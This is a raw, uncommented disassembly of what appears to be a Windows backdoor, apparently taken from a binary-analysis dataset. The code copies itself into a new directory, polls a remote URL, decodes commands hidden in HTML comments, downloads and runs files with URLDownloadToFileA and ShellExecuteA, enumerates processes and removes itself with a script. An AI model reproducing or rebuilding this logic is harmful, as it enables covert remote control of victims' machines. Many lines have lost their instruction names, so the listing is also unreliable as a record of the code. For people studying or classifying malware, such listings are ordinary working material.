mov edi [ Sleep@IAT ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
lea edx [ esp + 0xc8 ]
push ebx
push edx
call sub_403640
add esp 0x8
mov [ esp + 0x14 ] eax
push ebx
call ??3@YAXPAX@Z
mov ecx [ esp + 0x24 ]
add esp 0x4
push ecx
call [ CloseHandle@IAT ]
pop esi
pop ebp
pop edi
xor eax eax
pop ebx
add esp 0x2c0
retn 0x10
mov esi [ GetLocalTime@IAT ]
mov ebp [ sprintf@IAT ]
lea ecx [ esp + 0xc8 ]
push ecx
call sub_4036d0
add esp 0x4
lea edi [ esp + 0x1cc ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc8 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ Sleep@IAT ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
lea eax [ esp + 0x24 ]
push eax
call esi
lea eax [ ebx + 0x100 ]
push ebx
mov ecx [ esp + 0x32 ]
mov edx [ esp + 0x30 ]
and ecx 0xffff
push eax
mov eax [ esp + 0x44 ]
and edx 0xffff
push ecx
mov ecx [ esp + 0x44 ]
push edx
push eax
push ecx
lea edx [ ebx + 0x210 ]
push rw-data
push edx
call ebp
push ebx
call sub_403720
add esp 0x24
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0xea60
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x5
push eax
call edi
mov eax [ rw-data ]
test eax eax
jne r-xdata
sub_403640
sub esp 0x104
lea eax [ esp ]
push ebx
push esi
push edi
xor esi esi
push 0x104
push eax
push esi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x104
retn
mov esi [ esp + 0x114 ]
push 0x5c
push esi
call [ strrchr@IAT ]
add esp 0x8
mov edi eax
push 0x0
push esi
mov [ edi ] 0x0
call [ CreateDirectoryA@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea ecx [ esp + 0x10 ]
push esi
push ecx
mov [ edi ] 0x5c
call [ CopyFileA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x104
retn
call [ GetLastError@IAT ]
cmp eax 0xb7
jne r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
add esp 0x104
retn
sub_4036d0
mov eax [ esp + 0x4 ]
sub esp 0x200
lea ecx [ esp ]
push eax
push rw-data
push rw-data
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0x14
lea edx [ esp ]
push 0x0
push 0x0
push edx
push rw-data
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
add esp 0x200
retn
sub_403720
sub esp 0x114
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
push ebx
push esi
push edi
mov edi rw-data
xor ebx ebx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x20 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi ecx
je r-xdata
mov esi [ esp + 0x124 ]
push ebp
push 0x0
push 0x0
lea ebp [ esi + 0x210 ]
push 0x0
push 0x0
push ebp
call [ InternetOpenA@IAT ]
test eax eax
mov [ esp + 0x20 ] eax
je r-xdata
mov cl [ esp + eax + 0x20 ]
sar cl 0x1
and cl 0x7f
mov [ esp + eax + 0x20 ] cl
inc eax
cmp eax esi
jb r-xdata
mov edi [ esp + 0x18 ]
push 0x0
push 0x80000000
push 0x0
lea edx [ esp + 0x30 ]
push 0x0
push edx
push eax
call [ InternetOpenUrlA@IAT ]
mov edi eax
test edi edi
mov [ esp + 0x18 ] edi
je r-xdata
mov eax [ esp + 0x20 ]
pop ebp
test eax eax
je r-xdata
push edi
call [ InternetCloseHandle@IAT ]
lea eax [ esp + 0x10 ]
push eax
push 0x1000
push ebp
push edi
call [ InternetReadFile@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
add esp 0x114
retn
push eax
call [ InternetCloseHandle@IAT ]
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ebx 0x1
jmp r-xdata
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x1c ]
lea ecx [ eax + ebx ]
add eax ebx
add ebp ecx
mov ecx [ esp + 0x14 ]
sub ecx eax
mov eax [ esp + 0x10 ]
test ebx ebx
mov [ esp + 0x14 ] ecx
jne r-xdata
cmp ebx 0x100
jae r-xdata
lea ecx [ esp + 0x1c ]
push ecx
push eax
push ebp
call sub_403c00
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
test eax eax
je r-xdata
mov edx [ esp + 0x1c ]
lea eax [ esi + 0x110 ]
mov ecx ebx
mov edi eax
lea esi [ edx + ebp ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ eax + ebx ] 0x0
mov eax [ esp + 0x128 ]
push eax
call sub_403950
mov esi [ esp + 0x12c ]
mov edi [ esp + 0x1c ]
add esp 0x4
lea edx [ esp + 0x10 ]
lea ebp [ esi + 0x210 ]
push edx
push 0x1000
push ebp
push edi
call [ InternetReadFile@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
jmp r-xdata
sub_4038d0
mov eax [ esp + 0x4 ]
push esi
test eax eax
push edi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
push edi
push eax
call [ strstr@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp [ ecx + esi ] 0x22
jne r-xdata
mov al [ ecx + esi ]
mov edi [ esp + 0x14 ]
xor edx edx
cmp al 0x22
je r-xdata
inc ecx
mov [ edx + edi ] 0x0
mov cl [ ecx + esi ]
cmp cl 0x22
je r-xdata
test al al
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
cmp cl 0x20
jne r-xdata
cmp al 0x20
je r-xdata
mov [ edx + edi ] al
mov al [ ecx + esi + 0x1 ]
inc edx
inc ecx
cmp al 0x22
jne r-xdata
sub_403950
sub esp 0x208
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x21c ]
xor dl dl
mov [ esp + 0x13 ] dl
lea esi [ edi + 0x110 ]
mov ecx esi
mov al [ ecx ]
test al al
je r-xdata
mov ebx esi
cmp [ ebx ] 0xd
jne r-xdata
add dl al
mov al [ ecx + 0x1 ]
inc ecx
test al al
jne r-xdata
push 0x4
push rw-data
push ebx
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
add ebx 0x2
mov [ esp + 0x13 ] dl
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x208
retn
push rw-data
push ebx
call [ strstr@IAT ]
add esp 0x8
test eax eax
je r-xdata
movsx eax [ eax + 0x7 ]
sub eax 0x30
mov [ esp + 0x14 ] eax
lea eax [ esp + 0x18 ]
push eax
push rw-data
push ebx
call sub_4038d0
add esp 0xc
test eax eax
je r-xdata
mov ebp [ strrchr@IAT ]
lea ecx [ esp + 0x18 ]
push 0x23
push ecx
call ebp
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push 0x2e
push esi
call ebp
add esp 0x8
test eax eax
je r-xdata
inc esi
mov [ eax ] 0x0
push esi
call sub_4040e0
add edi 0x100
push esi
push edi
mov edi [ _strcmpi@IAT ]
call edi
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax 0x4
ja r-xdata
push rw-data
push esi
call edi
add esp 0x8
test eax eax
je r-xdata
mov cl [ esp + 0x13 ]
mov [ rw-data ] cl
jmp [ eax * 4 + jump_table_403bec ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x208
retn
lea edx [ esp + 0x18 ]
push edx
push rw-data
push ebx
call sub_4038d0
add esp 0xc
test eax eax
je r-xdata
mov cl [ esp + 0x13 ]
mov al [ rw-data ]
cmp cl al
jne r-xdata
mov cl [ esp + 0x13 ]
mov al [ rw-data ]
cmp cl al
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
call sub_403eb0
lea eax [ esp + 0x18 ]
push eax
call [ atoi@IAT ]
add esp 0x4
test eax eax
je r-xdata
lea edx [ esp + 0x18 ]
push 0x2f
push edx
call ebp
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x208
retn
lea edx [ esp + 0x18 ]
push 0x2f
push edx
call ebp
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x208
retn
mov [ rw-data ] eax
jmp r-xdata
mov [ eax ] 0x0
lea eax [ esp + 0x19 ]
push eax
call sub_4040e0
lea edi [ esp + 0x1d ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call ??2@YAPAXI@Z
mov edx eax
add esp 0x8
test edx edx
je r-xdata
mov [ eax ] 0x0
lea eax [ esp + 0x19 ]
push eax
call sub_4040e0
lea edi [ esp + 0x1d ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push ecx
call ??2@YAPAXI@Z
mov edx eax
add esp 0x8
test edx edx
je r-xdata
lea edi [ esp + 0x19 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
push edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push sub_403c80
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea edi [ esp + 0x19 ]
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
push edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push sub_403db0
and ecx 0x3
[ edi ] [ esi ]
push 0x0
push 0x0
call [ CreateThread@IAT ]
push eax
call [ CloseHandle@IAT ]
jmp r-xdata
sub_403c00
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor edx edx
lea ebp [ edi - 0x6 ]
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov ecx [ esp + 0x14 ]
mov bl 0x2d
inc edx
cmp edx ebp
je r-xdata
cmp [ ecx + edx + 0x1 ] 0x21
jne r-xdata
jmp r-xdata
cmp [ edx + ecx + 0x2 ] bl
jne r-xdata
cmp [ ecx + edx ] 0x3c
lea eax [ edx + 0x4 ]
jne r-xdata
cmp [ edx + ecx + 0x3 ] bl
jne r-xdata
lea esi [ edi - 0x2 ]
cmp eax esi
je r-xdata
cmp [ ecx + eax ] bl
jne r-xdata
inc eax
cmp eax esi
jne r-xdata
cmp [ ecx + eax + 0x1 ] bl
jne r-xdata
cmp [ ecx + eax + 0x2 ] 0x3e
je r-xdata
mov ecx [ esp + 0x1c ]
sub eax edx
sub eax 0x4
pop edi
add edx 0x4
pop esi
pop ebp
mov [ ecx ] edx
pop ebx
retn
sub_403c80
push ecx
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
push ebx
push ebp
push edi
push 0x100
call ??2@YAPAXI@Z
push 0x100
mov ebx eax
call ??2@YAPAXI@Z
add esp 0x8
mov ebp eax
test ebx ebx
je r-xdata
mov eax 0x1
pop esi
pop ecx
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
test ebp ebp
je r-xdata
test ebp ebp
je r-xdata
test ebx ebx
je r-xdata
push ebp
call ??3@YAXPAX@Z
add esp 0x4
cmp [ esi + 0x4 ] 0x3a
jne r-xdata
pop edi
pop ebp
pop ebx
mov eax 0x1
pop esi
pop ecx
retn 0x4
push ebx
call ??3@YAXPAX@Z
add esp 0x4
lea edi [ esi + 0x8 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] 0x1
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edi [ esi + 0x7 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x10 ] 0x0
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
jmp r-xdata
mov esi [ esp + 0x18 ]
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
mov [ edx ] 0x0
push ecx
push ebp
push rw-data
push ebx
mov [ rw-data ] 0x1
call sub_401570
add esp 0x10
mov [ rw-data ] 0x0
and ecx 0x3
push 0x2f
[ edi ] [ esi ]
push ebx
call [ strchr@IAT ]
mov edx eax
add esp 0x8
test edx edx
je r-xdata
sub_403db0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push ebx
push ebp
push edi
push 0x104
call ??2@YAPAXI@Z
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
mov eax 0x1
pop esi
retn 0x4
mov edx [ esp + 0x14 ]
push edx
call ??3@YAXPAX@Z
add esp 0x4
test ebx ebx
je r-xdata
push 0x104
push ebx
push 0x0
call [ GetModuleFileNameA@IAT ]
mov ebp [ strrchr@IAT ]
push 0x5c
push ebx
call ebp
add esp 0x8
test eax eax
je r-xdata
pop edi
pop ebp
pop ebx
mov eax 0x1
pop esi
retn 0x4
push ebx
call ??3@YAXPAX@Z
add esp 0x4
push 0x2f
push esi
mov [ eax + 0x1 ] 0x0
call ebp
add esp 0x8
test eax eax
je r-xdata
lea edi [ eax + 0x1 ]
or ecx 0xffffffff
xor eax eax
push 0x2e
[ edi ]
not ecx
sub edi ecx
push ebx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x0
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi edx
push ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x20 ]
push ecx
push 0x0
call URLDownloadToFileA
push 0x0
push 0x0
push 0x0
push ebx
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
sub_403eb0
sub esp 0x70
push ebx
mov al 0x40
push ebp
mov bl 0x1a
mov dl 0x14
mov cl 0xe6
push esi
mov [ esp + 0x1f ] al
mov [ esp + 0x22 ] al
mov [ esp + 0x27 ] al
mov [ esp + 0x2d ] al
mov [ esp + 0x30 ] al
mov [ esp + 0x35 ] al
mov [ esp + 0x40 ] al
push edi
mov [ esp + 0x18 ] 0x74
mov [ esp + 0x19 ] 0x84
mov [ esp + 0x1a ] 0x8a
mov [ esp + 0x1b ] 0x8e
mov [ esp + 0x1c ] 0x92
mov [ esp + 0x1d ] 0x9c
mov [ esp + 0x1e ] bl
mov [ esp + 0x1f ] dl
mov [ esp + 0x20 ] 0xc8
mov [ esp + 0x21 ] 0xca
mov [ esp + 0x22 ] 0xd8
mov [ esp + 0x24 ] 0x4a
mov [ esp + 0x25 ] cl
mov [ esp + 0x27 ] bl
mov [ esp + 0x28 ] dl
mov [ esp + 0x29 ] 0xd2
mov [ esp + 0x2a ] 0xcc
mov [ esp + 0x2c ] 0xca
mov [ esp + 0x2d ] 0xf0
mov [ esp + 0x2e ] 0xd2
mov [ esp + 0x2f ] cl
mov [ esp + 0x30 ] 0xe8
mov [ esp + 0x32 ] 0x4a
mov [ esp + 0x33 ] cl
mov [ esp + 0x35 ] 0xce
mov [ esp + 0x36 ] 0xde
mov [ esp + 0x37 ] 0xe8
mov [ esp + 0x38 ] 0xde
mov [ esp + 0x3a ] 0x84
mov [ esp + 0x3b ] 0x8a
mov [ esp + 0x3c ] 0x8e
mov [ esp + 0x3d ] 0x92
mov [ esp + 0x3e ] 0x9c
mov [ esp + 0x3f ] bl
mov [ esp + 0x40 ] dl
mov [ esp + 0x41 ] 0xc8
mov [ esp + 0x42 ] 0xca
mov [ esp + 0x43 ] 0xd8
mov [ esp + 0x45 ] 0x4a
mov [ esp + 0x46 ] cl
mov [ esp + 0x47 ] bl
mov [ esp + 0x48 ] dl
mov [ esp + 0x49 ] 0x0
xor eax eax
mov cl [ esp + eax + 0x18 ]
shr cl 0x1
mov [ esp + eax + 0x4c ] cl
inc eax
cmp eax 0x32
jl r-xdata
lea edx [ esp + 0x10 ]
push 0x0
push edx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
mov eax [ esp + 0x10 ]
push rw-data
push eax
call [ RegDeleteValueA@IAT ]
mov ecx [ esp + 0x10 ]
push ecx
call [ RegCloseKey@IAT ]
push 0x104
call ??2@YAPAXI@Z
push 0x400
mov ebx eax
call ??2@YAPAXI@Z
add esp 0x8
mov ebp eax
push 0x104
push ebx
push 0x0
call [ GetModuleFileNameA@IAT ]
push ebx
push rw-data
push ebp
mov [ eax + ebx ] 0x0
call [ sprintf@IAT ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
push rw-data
[ edi ]
not ecx
sub edi ecx
push ebx
mov edx ecx
mov esi edi
mov edi ebx
lea eax [ esp + 0x60 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebp
call [ sprintf@IAT ]
add esp 0x20
push 0x0
push 0x80
push 0x2
push 0x0
push 0x4
push 0x40000000
push rw-data
call [ CreateFileA@IAT ]
push ebp
mov esi eax
call [ lstrlenA@IAT ]
lea ecx [ esp + 0x14 ]
push 0x0
push ecx
push eax
push ebp
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
push ebx
call ??3@YAXPAX@Z
push ebp
call ??3@YAXPAX@Z
add esp 0x8
push 0x0
push 0x0
push 0x0
push rw-data
push 0x0
push 0x0
call [ ShellExecuteA@IAT ]
push 0x0
call [ ExitProcess@IAT ]
sub_4040e0
sub esp 0x44
mov ecx 0x10
xor eax eax
push ebx
push esi
push edi
lea edi [ esp + 0xc ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax 0x61
lea ecx [ esp + 0xc ]
sub ecx eax
mov [ ecx + eax ] al
inc eax
cmp eax 0x7a
jle r-xdata
lea ecx [ esp + 0xc ]
mov eax 0x41
sub ecx 0x27
mov [ ecx + eax ] al
inc eax
cmp eax 0x5a
jle r-xdata
mov eax 0x30
mov [ esp + eax + 0x10 ] al
inc eax
cmp eax 0x39
jle r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x54 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x44
retn
mov cl [ esi ]
test cl cl
je r-xdata
cmp cl 0x23
jne r-xdata
xor eax eax
mov [ esi ] 0x3a
jmp r-xdata
add eax 0x38
mov ecx 0x42
cdq
idiv ecx
mov dl [ esp + edx + 0xc ]
mov [ esi ] dl
inc eax
cmp eax 0x42
jl r-xdata
mov cl [ esi + 0x1 ]
inc esi
test cl cl
jne r-xdata
cmp [ esp + eax + 0xc ] cl
je r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40435f
cmp [ rw-data ] ebx
jne r-xdata
call sub_40434a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_40435c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_403310
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401000
push esi
mov esi ecx
call sub_401090
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
add esp 0x4
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_40434a
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_40435c
xor eax eax
retn
sub_40435f
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
GetUserNameExA
jmp [ GetUserNameExA@IAT ]
sub_404380
lea ecx [ ebp - 0x258 ]
jmp sub_401090
sub_40438b
mov eax r--data
jmp __CxxFrameHandler
sub_4043a0
lea ecx [ ebp - 0x278 ]
jmp sub_401090
sub_4043ab
mov eax r--data
jmp __CxxFrameHandler
